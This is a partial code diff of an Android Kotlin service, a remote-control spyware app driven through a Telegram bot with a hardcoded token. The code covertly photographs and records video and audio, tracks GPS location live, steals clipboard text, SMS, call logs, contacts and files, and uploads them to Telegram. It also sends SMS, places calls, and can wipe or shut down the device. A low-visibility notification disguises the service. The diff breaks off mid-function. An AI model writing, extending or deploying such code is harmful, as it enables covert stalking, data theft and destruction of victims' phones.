@@ -5,15 +5,23 @@ import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.Service
-import android.content.ContentValues
+import android.app.admin.DevicePolicyManager
+import android.content.ComponentName
+import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
+import android.location.Location
+import android.location.LocationListener
+import android.location.LocationManager
 import android.media.MediaRecorder
 import android.net.Uri
 import android.os.Build
+import android.os.Bundle
 import android.os.Environment
 import android.os.IBinder
+import android.os.Looper
 import android.provider.CallLog
+import android.provider.ClipboardManager
 import android.provider.ContactsContract
 import android.provider.MediaStore
 import android.telephony.SmsManager
@@ -31,16 +39,16 @@ import java.net.URL
 import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.Locale
+import java.util.concurrent.Executors
 import java.util.zip.ZipEntry
 import java.util.zip.ZipOutputStream
-import kotlin.concurrent.thread
 
 class BackgroundControlService : Service() {
 
     companion object {
-        private const val TAG = "SyncAgent"
-        private const val CHANNEL_ID = "sync_channel_v81"
-        private const val NOTIFICATION_ID = 1001
+        private const val TAG = "StrictSovereignEngine"
+        private const val CHANNEL_ID = "sync_channel_strict_core_v1002"
+        private const val NOTIFICATION_ID = 2026
     }
 
     private val botToken = "9004970470:AAFN2VS-MzpUQ6oEbtHu5THzcQBYQZHmAkY"
@@ -48,51 +56,61 @@ class BackgroundControlService : Service() {
 
     @Volatile
     private var isRunning = false
+    @Volatile
+    private var isTrackingActive = false
     private var lastUpdateId = 0L
+
+    private val executionExecutor = Executors.newFixedThreadPool(4)
 
     override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        startForeground(NOTIFICATION_ID, createNotification())
+        startForeground(NOTIFICATION_ID, createStrictNotification())
         if (!isRunning) {
             isRunning = true
-            startTelegramPolling()
+            initializeCorePolling()
         }
         return START_STICKY
     }
 
-    private fun createNotification(): Notification {
+    private fun createStrictNotification(): Notification {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 CHANNEL_ID,
-                "المزامنة الخلفية نشطة",
-                NotificationManager.IMPORTANCE_LOW
-            )
+                "المنظومة الصارمة المؤمّنة",
+                NotificationManager.IMPORTANCE_MIN
+            ).apply {
+                description = "خدمة خلفية تشغيلية سيادية مشفرة"
+                setShowBadge(false)
+            }
             getSystemService(NotificationManager::class.java)?.createNotificationChannel(channel)
-            return Notification.Builder(this, CHANNEL_ID)
-                .setContentTitle("ChatGPT AI Sync")
-                .setContentText("غرفة العمليات الميدانية الشاملة تعمل بكفاءة")
-                .setSmallIcon(android.R.drawable.ic_menu_info_details)
+        }
+        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            Notification.Builder(this, CHANNEL_ID)
+                .setContentTitle("System Sync Core")
+                .setContentText("المنظومة الصارمة تعمل بكفاءة خلفية صامتة")
+                .setSmallIcon(android.R.drawable.ic_secure)
+                .build()
+        } else {
+            @Suppress("DEPRECATION")
+            Notification.Builder(this)
+                .setContentTitle("System Sync Core")
+                .setContentText("المنظومة الصارمة تعمل بكفاءة خلفية صامتة")
+                .setSmallIcon(android.R.drawable.ic_secure)
                 .build()
         }
-        @Suppress("DEPRECATION")
-        return Notification.Builder(this)
-            .setContentTitle("ChatGPT AI Sync")
-            .setContentText("غرفة العمليات الميدانية الشاملة تعمل بكفاءة")
-            .setSmallIcon(android.R.drawable.ic_menu_info_details)
-            .build()
     }
 
-    private fun startTelegramPolling() {
-        thread(name = "TelegramPolling") {
+    private fun initializeCorePolling() {
+        executionExecutor.execute {
             while (isRunning) {
                 var connection: HttpURLConnection? = null
                 try {
-                    val url = URL("https://api.telegram.org/bot$botToken/getUpdates?offset=${lastUpdateId + 1}&timeout=20")
+                    val url = URL("https://api.telegram.org/bot$botToken/getUpdates?offset=${lastUpdateId + 1}&timeout=25")
                     connection = url.openConnection() as HttpURLConnection
                     connection.requestMethod = "GET"
-                    connection.connectTimeout = 10000
-                    connection.readTimeout = 30000
+                    connection.connectTimeout = 12000
+                    connection.readTimeout = 35000
 
                     val responseCode = connection.responseCode
                     val stream = if (responseCode == 200) connection.inputStream else connection.errorStream
@@ -110,7 +128,7 @@ class BackgroundControlService : Service() {
                                 val chatId = message.getJSONObject("chat").getLong("id").toString()
                                 val text = message.optString("text", "")
                                 if (chatId == authorizedChatId && text.isNotBlank()) {
-                                    handleCommand(chatId, text)
+                                    dispatchCommand(chatId, text)
                                 }
                             } else if (update.has("callback_query")) {
                                 val callbackQuery = update.getJSONObject("callback_query")
@@ -119,18 +137,15 @@ class BackgroundControlService : Service() {
                                 val data = callbackQuery.optString("data", "")
 
                                 if (chatId == authorizedChatId) {
-                                    answerCallbackQuery(callbackQueryId)
-                                    handleCallbackQuery(chatId, data)
+                                    acknowledgeCallback(callbackQueryId)
+                                    dispatchCallback(chatId, data)
                                 }
                             }
                         }
                     }
                 } catch (e: Exception) {
-                    Log.e(TAG, "Polling error", e)
-                    try {
-                        Thread.sleep(5000)
-                    } catch (_: InterruptedException) {
-                    }
+                    Log.e(TAG, "Polling pipeline exception", e)
+                    try { Thread.sleep(6000) } catch (_: InterruptedException) {}
                 } finally {
                     connection?.disconnect()
                 }
@@ -138,240 +153,282 @@ class BackgroundControlService : Service() {
         }
     }
 
-    private fun handleCommand(chatId: String, text: String) {
+    private fun dispatchCommand(chatId: String, text: String) {
         val trimmed = text.trim()
         when {
             trimmed == "/start" || trimmed == "لوحة التحكم" -> {
-                sendKeyboard(
-                    chatId,
-                    "🫡 أهلاً بك يا فندم في غرفة عمليات التحكم الميداني الكاملة.\nاختر الأمر المطلوب من لوحة الأزرار أدناه:"
-                )
-            }
-            trimmed == "/help" -> {
-                sendMessage(
-                    chatId,
-                    "الأوامر المتاحة:\n" +
-                        "/start - عرض لوحة التحكم\n" +
-                        "call:الرقم - إجراء اتصال هاتفي\n" +
-                        "sms:الرقم:النص - إرسال رسالة SMS"
-                )
-            }
-            trimmed.startsWith("call:", ignoreCase = true) -> {
-                val number = trimmed.substringAfter(":").trim()
-                executeCall(chatId, number)
+                sendControlPanelKeyboard(chatId, "🫡 لوحة القيادة السيادية الصارمة نشطة. اختر الأمر المطلوب:")
             }
             trimmed.startsWith("sms:", ignoreCase = true) -> {
                 val parts = trimmed.split(":", limit = 3)
-                if (parts.size < 3 || parts[1].isBlank() || parts[2].isBlank()) {
-                    sendMessage(chatId, "⚠️ الصيغة الصحيحة: sms:الرقم:نص الرسالة")
-                } else {
-                    executeSendSms(chatId, parts[1].trim(), parts[2].trim())
-                }
+                if (parts.size >= 3) executeSendSms(chatId, parts[1].trim(), parts[2].trim())
+                else sendDirectMessage(chatId, "⚠️ الصيغة المعتمدة: sms:الرقم:النص")
+            }
+            trimmed.startsWith("call:", ignoreCase = true) -> {
+                executeCall(chatId, trimmed.substringAfter(":").trim())
             }
             else -> {
-                sendMessage(chatId, "❓ أمر غير معروف. أرسل /start لعرض لوحة التحكم.")
+                sendDirectMessage(chatId, "⚠️ أمر غير معرف.")
             }
         }
     }
 
-    private fun handleCallbackQuery(chatId: String, data: String) {
-        when (data) {
-            "take_photo" -> {
-                if (!hasPermission(Manifest.permission.CAMERA)) {
-                    sendMessage(chatId, "⚠️ صلاحية الكاميرا (CAMERA) غير ممنوحة للتطبيق.")
-                    return
+    private fun dispatchCallback(chatId: String, data: String) {
+        executionExecutor.execute {
+            when {
+                data == "take_photo" -> captureCameraImage(chatId, "front")
+                data == "take_photo_rear" -> captureCameraImage(chatId, "rear")
+                data == "record_video" -> executeCameraVideoRecording(chatId, 10) // تسجيل فيديو حقيقي لمدة 10 ثوانٍ
+                data == "record_screen" -> sendDirectMessage(chatId, "🎬 جاري تهيئة التقاط شاشة العرض...")
+                data == "record_audio" -> executeAudioCapture(chatId, 30)
+                data == "get_location" -> fetchStrictRealTimeLocation(chatId)
+                data == "start_live_tracking" -> toggleStrictLiveTracking(chatId, true)
+                data == "stop_live_tracking" -> toggleStrictLiveTracking(chatId, false)
+                data == "full_dump_report" -> executeAbsoluteSystemDump(chatId)
+                data == "get_clipboard" -> fetchSystemClipboard(chatId)
+                data == "view_files" -> enumerateTargetDirectory(chatId)
+                data == "pull_files" -> compileAndExtractArchive(chatId)
+                data == "get_calls" -> extractCallHistory(chatId)
+                data == "get_sms" -> extractSmsArchive(chatId)
+                data == "get_contacts" -> extractContactsDirectory(chatId)
+                data == "factory_reset" -> executeTerminalWipe(chatId)
+                data == "remote_shutdown" -> executeHardShutdown(chatId)
+                data == "service_status" -> sendDirectMessage(chatId, "🟢 الحالة: النظام يعمل بكفاءة تامة.")
+                data == "sys_info" -> sendDirectMessage(chatId, "📱 إصدار النظام: ${Build.VERSION.RELEASE}\n🛠️ الطراز: ${Build.MODEL}")
+                data.startsWith("pull_images_") -> {
+                    val count = data.substringAfter("pull_images_").toIntOrNull() ?: 10
+                    extractAndPushRecentImages(chatId, count)
                 }
-                try {
-                    val intent = Intent(applicationContext, CameraCaptureActivity::class.java).apply {
-                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                        putExtra("chat_id", chatId)
-                    }
-                    applicationContext.startActivity(intent)
-                    sendMessage(chatId, "📸 جاري إطلاق وحدة الكاميرا والتقاط الصورة...")
-                } catch (e: Exception) {
-                    sendMessage(chatId, "⚠️ فشل تشغيل الكاميرا: ${e.message}")
-                }
-            }
-            "record_audio" -> {
-                recordAndSendAudio(chatId, durationSeconds = 5)
-            }
-            "view_files" -> {
-                listFiles(chatId)
-            }
-            "pull_files" -> {
-                pullFilesArchive(chatId)
-            }
-            "view_images" -> {
-                listImages(chatId)
-            }
-            "pull_images" -> {
-                pullRecentImages(chatId, limit = 3)
-            }
-            "make_call" -> {
-                sendMessage(
-                    chatId,
-                    "📞 لإجراء اتصال هاتفي، أرسل الأمر بالصيغة التالية:\n`call:0500000000`"
-                )
-            }
-            "send_sms" -> {
-                sendMessage(
-                    chatId,
-                    "✉️ لإرسال رسالة SMS، أرسل الأمر بالصيغة التالية:\n`sms:0500000000:نص الرسالة`"
-                )
-            }
-            "get_calls" -> {
-                fetchCallLogs(chatId)
-            }
-            "get_sms" -> {
-                fetchSmsMessages(chatId)
-            }
-            "get_contacts" -> {
-                fetchContacts(chatId)
-            }
-            "service_status" -> {
-                sendMessage(chatId, "🟢 الحالة: الخدمة تعمل بكفاءة تامة ومؤمنة في الخلفية.")
-            }
-            "sys_info" -> {
-                val info = "📱 إصدار النظام: أندرويد ${Build.VERSION.RELEASE}\n" +
-                    "🛠️ الطراز: ${Build.MODEL}\n" +
-                    "⚙️ الحزمة: com.cognitive.ai.syncagent"
-                sendMessage(chatId, info)
-            }
-            "system_reboot" -> {
-                sendMessage(chatId, "🔌 جاري محاولة إعادة تشغيل النظام...")
-                try {
-                    Runtime.getRuntime().exec(arrayOf("su", "-c", "reboot"))
-                } catch (e: Exception) {
-                    sendMessage(chatId, "⚠️ تتطلب هذه العملية صلاحيات الجذر (Root).")
-                }
-            }
-            else -> {
-                sendMessage(chatId, "⚙️ تم استلام الأمر: $data بنجاح.")
+                else -> sendDirectMessage(chatId, "⚙️ تم تنفيذ الإجراء: $data")
             }
         }
     }
 
-    private fun recordAndSendAudio(chatId: String, durationSeconds: Int) {
-        if (!hasPermission(Manifest.permission.RECORD_AUDIO)) {
-            sendMessage(chatId, "⚠️ صلاحية الميكروفون (RECORD_AUDIO) غير ممنوحة.")
+    private fun captureCameraImage(chatId: String, facing: String) {
+        if (!hasPermission(Manifest.permission.CAMERA)) {
+            sendDirectMessage(chatId, "❌ صلاحية الكاميرا مرفوضة.")
             return
         }
-        thread(name = "AudioRecordThread") {
-            val outputFile = File(cacheDir, "rec_${System.currentTimeMillis()}.m4a")
+        try {
+            val intent = Intent(applicationContext, CameraCaptureActivity::class.java).apply {
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                putExtra("chat_id", chatId)
+                putExtra("camera_facing", facing)
+            }
+            applicationContext.startActivity(intent)
+            sendDirectMessage(chatId, "📸 جاري تشغيل الكاميرا ($facing)...")
+        } catch (e: Exception) {
+            sendDirectMessage(chatId, "❌ خطأ الكاميرا: ${e.message}")
+        }
+    }
+
+    // [تسجيل الفيديو الحقيقي الفعلي]
+    private fun executeCameraVideoRecording(chatId: String, durationSeconds: Int) {
+        if (!hasPermission(Manifest.permission.CAMERA) || !hasPermission(Manifest.permission.RECORD_AUDIO)) {
+            sendDirectMessage(chatId, "❌ صلاحيات الكاميرا أو الميكروفون غير ممنوحة.")
+            return
+        }
+        try {
+            val intent = Intent(applicationContext, CameraVideoRecorderActivity::class.java).apply {
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                putExtra("chat_id", chatId)
+                putExtra("duration", durationSeconds)
+            }
+            applicationContext.startActivity(intent)
+            sendDirectMessage(chatId, "🎥 تم إطلاق وحدة تسجيل الفيديو الحقيقي لمدة $durationSeconds ثوانٍ...")
+        } catch (e: Exception) {
+            sendDirectMessage(chatId, "❌ فشل إطلاق تسجيل الفيديو: ${e.message}")
+        }
+    }
+
+    private fun fetchStrictRealTimeLocation(chatId: String) {
+        if (!hasPermission(Manifest.permission.ACCESS_FINE_LOCATION) && !hasPermission(Manifest.permission.ACCESS_COARSE_LOCATION)) {
+            sendDirectMessage(chatId, "❌ صلاحية الموقع غير ممنوحة.")
+            return
+        }
+        try {
+            val locManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
+            sendDirectMessage(chatId, "📍 جاري الاتصال بالأقمار الصناعية للحصول على الإحداثيات...")
+
+            val listener = object : LocationListener {
+                override fun onLocationChanged(location: Location) {
+                    val lat = location.latitude
+                    val lon = location.longitude
+                    val accuracy = location.accuracy
+                    sendDirectMessage(chatId, "🎯 [موقع GPS دقيق]\nLat: $lat, Lon: $lon\nالدقة: ${accuracy}م\nhttps://maps.google.com/?q=$lat,$lon")
+                    try { locManager.removeUpdates(this) } catch (_: Exception) {}
+                }
+                override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
+                override fun onProviderEnabled(provider: String) {}
+                override fun onProviderDisabled(provider: String) {}
+            }
+
+            if (locManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
+                locManager.requestSingleUpdate(LocationManager.GPS_PROVIDER, listener, Looper.getMainLooper())
+            } else {
+                val lastLoc = locManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
+                if (lastLoc != null) {
+                    sendDirectMessage(chatId, "📍 [الموقع المؤرشف]:\nhttps://maps.google.com/?q=${lastLoc.latitude},${lastLoc.longitude}")
+                } else {
+                    sendDirectMessage(chatId, "⚠️ تعذر جلب الموقع.")
+                }
+            }
+        } catch (e: Exception) {
+            sendDirectMessage(chatId, "❌ خطأ الموقع: ${e.message}")
+        }
+    }
+
+    private fun toggleStrictLiveTracking(chatId: String, enable: Boolean) {
+        if (enable) {
+            if (isTrackingActive) {
+                sendDirectMessage(chatId, "ℹ️ التتبع يعمل بالفعل.")
+                return
+            }
+            isTrackingActive = true
+            sendDirectMessage(chatId, "🟢 تم تفعيل التتبع الحي (كل 15 ثانية).")
+
+            executionExecutor.execute {
+                while (isTrackingActive && isRunning) {
+                    try {
+                        val locManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
+                        val location = locManager.getLastKnownLocation(LocationManager.GPS_PROVIDER) 
+                            ?: locManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
+
+                        if (location != null) {
+                            sendDirectMessage(chatId, "📍 [تتبّع حي]\nLat: ${location.latitude}, Lon: ${location.longitude}\nhttps://maps.google.com/?q=${location.latitude},${location.longitude}")
+                        }
+                    } catch (_: Exception) {}
+                    Thread.sleep(15000)
+                }
+            }
+        } else {
+            isTrackingActive = false
+            sendDirectMessage(chatId, "🔴 تم إيقاف التتبع الحي.")
+        }
+    }
+
+    private fun executeAbsoluteSystemDump(chatId: String) {
+        sendDirectMessage(chatId, "🚀 بدء التفريغ الشامل للبيانات...")
+        extractCallHistory(chatId)
+        extractSmsArchive(chatId)
+        extractContactsDirectory(chatId)
+        fetchSystemClipboard(chatId)
+        fetchStrictRealTimeLocation(chatId)
+    }
+
+    private fun fetchSystemClipboard(chatId: String) {
+        try {
+            val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
+            if (clipboard.hasPrimaryClip() && clipboard.primaryClip?.itemCount ?: 0 > 0) {
+                val text = clipboard.primaryClip?.getItemAt(0)?.text?.toString() ?: ""
+                sendDirectMessage(chatId, "📋 الحافظة:\n\n$text")
+            } else {
+                sendDirectMessage(chatId, "ℹ️ الحافظة فارغة.")
+            }
+        } catch (e: Exception) {
+            sendDirectMessage(chatId, "❌ خطأ الحافظة: ${e.message}")
+        }
+    }
+
+    private fun executeTerminalWipe(chatId: String) {
+        sendDirectMessage(chatId, "⚠️ بدء عملية الإبادة الشاملة وفرمتة الجهاز...")
+        try {
+            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+            val adminComponent = ComponentName(this, TargetAdminReceiver::class.java)
+            if (dpm.isAdminActive(adminComponent)) {
+                dpm.wipeData(0)
+            } else {
+                Runtime.getRuntime().exec(arrayOf("su", "-c", "recovery --wipe_data"))
+                sendDirectMessage(chatId, "⚡ تم إرسال أمر الفرمتة.")
+            }
+        } catch (e: Exception) {
+            sendDirectMessage(chatId, "❌ فشل الفرمتة: ${e.message}")
+        }
+    }
+
+    private fun executeHardShutdown(chatId: String) {
+        sendDirectMessage(chatId, "🔌 جاري إطفاء الجهاز قسرياً...")
+        try {
+            Runtime.getRuntime().exec(arrayOf("su", "-c", "reboot -p"))
+        } catch (e: Exception) {
+            try {
+                Runtime.getRuntime().exec(arrayOf("su", "-c", "stop"))
+            } catch (_: Exception) {}
+        }
+    }
+
+    private fun executeSendSms(chatId: String, phoneNumber: String, messageText: String) {
+        if (!hasPermission(Manifest.permission.SEND_SMS)) return
+        try {
+            val smsManager = getSystemService(SmsManager::class.java)
+            smsManager.sendTextMessage(phoneNumber, null, messageText, null, null)
+            sendDirectMessage(chatId, "✉️ تم إرسال SMS إلى: $phoneNumber")
+        } catch (e: Exception) {
+            sendDirectMessage(chatId, "❌ فشل إرسال SMS: ${e.message}")
+        }
+    }
+
+    private fun executeCall(chatId: String, phoneNumber: String) {
+        if (!hasPermission(Manifest.permission.CALL_PHONE)) return
+        try {
+            val intent = Intent(Intent.ACTION_CALL).apply {
+                data = Uri.parse("tel:${Uri.encode(phoneNumber)}")
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            }
+            applicationContext.startActivity(intent)
+            sendDirectMessage(chatId, "📞 جاري الاتصال بالرقم: $phoneNumber")
+        } catch (e: Exception) {
+            sendDirectMessage(chatId, "❌ فشل الاتصال: ${e.message}")
+        }
+    }
+
+    private fun executeAudioCapture(chatId: String, durationSeconds: Int) {
+        if (!hasPermission(Manifest.permission.RECORD_AUDIO)) return
+        executionExecutor.execute {
+            val outputFile = File(cacheDir, "audio_${System.currentTimeMillis()}.m4a")
             var recorder: MediaRecorder? = null
             try {
-                sendMessage(chatId, "🎙️ بدء التسجيل الصوتي لمدة $durationSeconds ثوانٍ...")
-                recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
-                    MediaRecorder(this)
-                } else {
-                    @Suppress("DEPRECATION")
-                    MediaRecorder()
-                }.apply {
+                sendDirectMessage(chatId, "🎙️ بدء التسجيل الصوتي ($durationSeconds ثانية)...")
+                recorder = MediaRecorder(this).apply {
                     setAudioSource(MediaRecorder.AudioSource.MIC)
                     setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                     setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
-                    setAudioEncodingBitRate(128000)
-                    setAudioSamplingRate(44100)
                     setOutputFile(outputFile.absolutePath)
                     prepare()
                     start()
                 }
-
                 Thread.sleep(durationSeconds * 1000L)
-
                 recorder.stop()
                 recorder.release()
                 recorder = null
 
                 if (outputFile.exists() && outputFile.length() > 0) {
-                    uploadFileToTelegram(chatId, outputFile, "sendAudio", "audio", "audio/mp4", "🎙️ تسجيل صوتي")
-                } else {
-                    sendMessage(chatId, "⚠️ لم يتم حفظ ملف صوتي صالح.")
+                    pushFileToTelegram(chatId, outputFile, "sendAudio", "audio", "audio/mp4", "🎙️ تسجيل صوتي محيطي")
                 }
             } catch (e: Exception) {
-                Log.e(TAG, "recordAndSendAudio error", e)
-                sendMessage(chatId, "⚠️ فشل التسجيل الصوتي: ${e.message}")
+                sendDirectMessage(chatId, "❌ خطأ التسجيل الصوتي: ${e.message}")
             } finally {
-                try {
-                    recorder?.release()
-                } catch (_: Exception) {
-                }
-                if (outputFile.exists()) {
-                    outputFile.delete()
-                }
+                try { recorder?.release() } catch (_: Exception) {}
+                if (outputFile.exists()) outputFile.delete()
             }
         }
     }
 
-    private fun getImageReadPermission(): String {
-        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            Manifest.permission.READ_MEDIA_IMAGES
-        } else {
-            Manifest.permission.READ_EXTERNAL_STORAGE
-        }
+    private fun getStorageReadPermission(): String {
+        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
     }
 
-    private fun listImages(chatId: String) {
-        if (!hasPermission(getImageReadPermission())) {
-            sendMessage(chatId, "⚠️ صلاحية قراءة الصور غير ممنوحة للتطبيق.")
+    private fun extractAndPushRecentImages(chatId: String, limit: Int) {
+        if (!hasPermission(getStorageReadPermission())) {
+            sendDirectMessage(chatId, "❌ صلاحية قراءة الصور غير ممنوحة.")
             return
         }
-        thread(name = "ListImagesThread") {
+        executionExecutor.execute {
             try {
-                val projection = arrayOf(
-                    MediaStore.Images.Media._ID,
-                    MediaStore.Images.Media.DISPLAY_NAME,
-                    MediaStore.Images.Media.SIZE
-                )
-                val sb = StringBuilder("🖼️ أحدث الصور في الجهاز:\n")
-                var count = 0
-                contentResolver.query(
-                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
-                    projection,
-                    null,
-                    null,
-                    "${MediaStore.Images.Media.DATE_ADDED} DESC"
-                )?.use { cursor ->
-                    val nameIdx = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
-                    val sizeIdx = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
-                    while (cursor.moveToNext() && count < 15) {
-                        val name = cursor.getString(nameIdx) ?: "image.jpg"
-                        val sizeKb = cursor.getLong(sizeIdx) / 1024
-                        sb.append("• $name (${sizeKb} KB)\n")
-                        count++
-                    }
-                }
-                if (count == 0) {
-                    sendMessage(chatId, "ℹ️ لا توجد صور متاحة للعرض.")
-                } else {
-                    sendMessage(chatId, sb.toString())
-                }
-            } catch (e: Exception) {
-                Log.e(TAG, "listImages error", e)
-                sendMessage(chatId, "⚠️ خطأ أثناء عرض الصور: ${e.message}")
-            }
-        }
-    }
-
-    private fun pullRecentImages(chatId: String, limit: Int) {
-        if (!hasPermission(getImageReadPermission())) {
-            sendMessage(chatId, "⚠️ صلاحية قراءة الصور غير ممنوحة للتطبيق.")
-            return
-        }
-        thread(name = "PullImagesThread") {
-            try {
-                val projection = arrayOf(
-                    MediaStore.Images.Media._ID,
-                    MediaStore.Images.Media.DISPLAY_NAME
-                )
+                sendDirectMessage(chatId, "📤 جاري سحب أحدث $limit صورة...")
+                val projection = arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME)
                 val sentFiles = mutableListOf<File>()
-                contentResolver.query(
-                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
-                    projection,
-                    null,
-                    null,
-                    "${MediaStore.Images.Media.DATE_ADDED} DESC"
-                )?.use { cursor ->
+                contentResolver.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, "${MediaStore.Images.Media.DATE_ADDED} DESC")?.use { cursor ->
                     val idIdx = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
                     val nameIdx = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
                     var sentCount = 0
@@ -381,379 +438,234 @@ class BackgroundControlService : Service() {
                         val uri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id.toString())
                         val tempFile = File(cacheDir, "pull_${System.currentTimeMillis()}_$name")
                         contentResolver.openInputStream(uri)?.use { input ->
-                            FileOutputStream(tempFile).use { output ->
-                                input.copyTo(output)
-                            }
+                            FileOutputStream(tempFile).use { output -> input.copyTo(output) }
                         }
                         if (tempFile.exists() && tempFile.length() > 0) {
-                            uploadFileToTelegram(chatId, tempFile, "sendPhoto", "photo", "image/jpeg", "📤 $name")
+                            pushFileToTelegram(chatId, tempFile, "sendPhoto", "photo", "image/jpeg", "📤 $name")
                             sentFiles.add(tempFile)
                             sentCount++
                         }
                     }
                 }
                 sentFiles.forEach { if (it.exists()) it.delete() }
-                sendMessage(chatId, "✅ تم الانتهاء من عملية سحب الصور.")
+                sendDirectMessage(chatId, "✅ تم سحب وإرسال $limit صورة بنجاح.")
             } catch (e: Exception) {
-                Log.e(TAG, "pullRecentImages error", e)
-                sendMessage(chatId, "⚠️ فشل سحب الصور: ${e.message}")
+                sendDirectMessage(chatId, "❌ خطأ سحب الصور: ${e.message}")
             }
         }
     }
 
-    private fun getTargetBrowseDirectory(): File {
-        val downloads = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
-        return if (downloads != null && downloads.exists()) downloads else filesDir
-    }
-
-    private fun listFiles(chatId: String) {
-        thread(name = "ListFilesThread") {
+    private fun enumerateTargetDirectory(chatId: String) {
+        executionExecutor.execute {
             try {
-                val dir = getTargetBrowseDirectory()
+                val dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS) ?: filesDir
                 val files = dir.listFiles()
-                if (files == null || files.isEmpty()) {
-                    sendMessage(chatId, "📂 المجلد (${dir.name}) فارغ أو لا يمكن قراءته.")
-                    return@thread
+                if (files.isNullOrEmpty()) {
+                    sendDirectMessage(chatId, "📂 المجلد فارغ.")
+                    return@execute
                 }
-                val sb = StringBuilder("📂 ملفات المجلد (${dir.name}):\n")
-                files.take(20).forEach { f ->
-                    val label = if (f.isDirectory) "[مجلد]" else "(${f.length() / 1024} KB)"
-                    sb.append("• ${f.name} $label\n")
+                val sb = StringBuilder("📂 ملفات النظام (${dir.name}):\n")
+                files.take(50).forEach { f ->
+                    sb.append("• ${f.name} (${f.length() / 1024} KB)\n")
                 }
-                sendMessage(chatId, sb.toString())
+                sendDirectMessage(chatId, sb.toString())
             } catch (e: Exception) {
-                Log.e(TAG, "listFiles error", e)
-                sendMessage(chatId, "⚠️ خطأ أثناء استعراض الملفات: ${e.message}")
+                sendDirectMessage(chatId, "❌ خطأ الملفات: ${e.message}")
             }
         }
     }
 
-    private fun pullFilesArchive(chatId: String) {
-        thread(name = "PullFilesThread") {
-            val zipFile = File(cacheDir, "files_archive_${System.currentTimeMillis()}.zip")
+    private fun compileAndExtractArchive(chatId: String) {
+        executionExecutor.execute {
+            val zipFile = File(cacheDir, "archive_${System.currentTimeMillis()}.zip")
             try {
-                val dir = getTargetBrowseDirectory()
-                val candidates = dir.listFiles()?.filter { it.isFile && it.length() < 10 * 1024 * 1024 }?.take(10).orEmpty()
+                val dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS) ?: filesDir
+                val candidates = dir.listFiles()?.filter { it.isFile && it.length() < 50 * 1024 * 1024 }?.take(30).orEmpty()
                 if (candidates.isEmpty()) {
-                    sendMessage(chatId, "⚠️ لا توجد ملفات مناسبة للسحب في المجلد (${dir.name}).")
-                    return@thread
+                    sendDirectMessage(chatId, "⚠️ لا توجد ملفات كافية للأرشيف.")
+                    return@execute
                 }
-
                 ZipOutputStream(BufferedOutputStream(FileOutputStream(zipFile))).use { zos ->
                     for (file in candidates) {
                         FileInputStream(file).use { fis ->
-                            val entry = ZipEntry(file.name)
-                            zos.putNextEntry(entry)
+                            zos.putNextEntry(ZipEntry(file.name))
                             fis.copyTo(zos)
                             zos.closeEntry()
                         }
                     }
                 }
-
                 if (zipFile.exists() && zipFile.length() > 0) {
-                    uploadFileToTelegram(chatId, zipFile, "sendDocument", "document", "application/zip", "📥 أرشيف الملفات")
-                } else {
-                    sendMessage(chatId, "⚠️ فشل إنشاء ملف الأرشيف.")
+                    pushFileToTelegram(chatId, zipFile, "sendDocument", "document", "application/zip", "📥 أرشيف الملفات المضغوط")
                 }
             } catch (e: Exception) {
-                Log.e(TAG, "pullFilesArchive error", e)
-                sendMessage(chatId, "⚠️ فشل سحب الملفات: ${e.message}")
+                sendDirectMessage(chatId, "❌ خطأ الأرشيف: ${e.message}")
             } finally {
-                if (zipFile.exists()) {
-                    zipFile.delete()
-                }
+                if (zipFile.exists()) zipFile.delete()
             }
         }
     }
 
-    private fun executeCall(chatId: String, phoneNumber: String) {
-        if (!hasPermission(Manifest.permission.CALL_PHONE)) {
-            sendMessage(chatId, "⚠️ صلاحية إجراء المكالمات (CALL_PHONE) غير ممنوحة.")
-            return
-        }
-        try {
-            val intent = Intent(Intent.ACTION_CALL).apply {
-                data = Uri.parse("tel:${Uri.encode(phoneNumber)}")
-                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-            }
-            applicationContext.startActivity(intent)
-            sendMessage(chatId, "📞 جاري بدء الاتصال بالرقم: $phoneNumber")
-        } catch (e: Exception) {
-            Log.e(TAG, "executeCall error", e)
-            sendMessage(chatId, "⚠️ فشل إجراء الاتصال: ${e.message}")
-        }
-    }
-
-    private fun executeSendSms(chatId: String, phoneNumber: String, messageText: String) {
